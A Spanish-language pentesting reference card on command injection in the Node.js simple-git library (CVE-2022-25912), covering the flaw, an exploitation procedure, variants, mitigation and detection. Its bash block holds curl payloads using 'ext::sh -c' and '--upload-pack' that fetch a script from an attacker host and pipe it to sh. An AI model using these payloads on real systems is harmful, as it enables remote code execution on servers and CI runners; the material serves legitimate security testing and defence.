---
topic: Inyección de comandos en simple-git
tags: [web, nodejs, simple-git, cve-2022-25912, rce]
---

# Inyección de comandos en simple-git

[🌐 English](simple-git-command-injection.en.md) | **Español**

## Concepto

La biblioteca `simple-git` pasa opciones controladas por el usuario al binario Git. Una URL con transporte `ext::` o una opción `--upload-pack` ejecuta un comando durante el clonado.

## Cuándo aplica

- Aplicaciones Node.js que clonan repositorios desde una URL del usuario.
- Versiones de `simple-git` anteriores a la corrección de CVE-2022-25912.
- Endpoints de informes, CI o análisis de código.

## Procedimiento

1. Identificar la versión de `simple-git` y el endpoint de clonado.
2. Probar una URL inocua y observar el error de Git.
3. Enviar una URL con `ext::sh -c ...` o `--upload-pack`.
4. Confirmar el callback y la ejecución.

```bash
npm ls simple-git
curl -s -X POST http://<HOST>/api/clone \
  -d 'repo=ext::sh -c "curl http://<IP>/s | sh"'
# Alternativa con --upload-pack
curl -s -X POST http://<HOST>/api/clone \
  -d 'repo=--upload-pack="curl http://<IP>/s|sh" https://example.com/r.git'
```

## Variantes

- `git://` con `ext::` habilitado.
- Opciones inyectadas en `clone` o `pull`.
- URLs que pasan por un parser laxo.
- Ejecución en un runner de CI con más privilegios.

## Limitaciones

- La versión debe ser vulnerable.
- Git debe permitir el transporte `ext`.
- El endpoint debe clonar una URL controlable.

## Mitigación y detección

- Actualizar `simple-git` y validar URLs contra esquemas permitidos.
- Deshabilitar `protocol.ext` y ejecutar clones en un sandbox sin red.
- Monitorizar procesos Git y conexiones salientes inesperadas.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2022-25912>
- <https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221>
- <https://git-scm.com/docs/gitprotocol-ext>
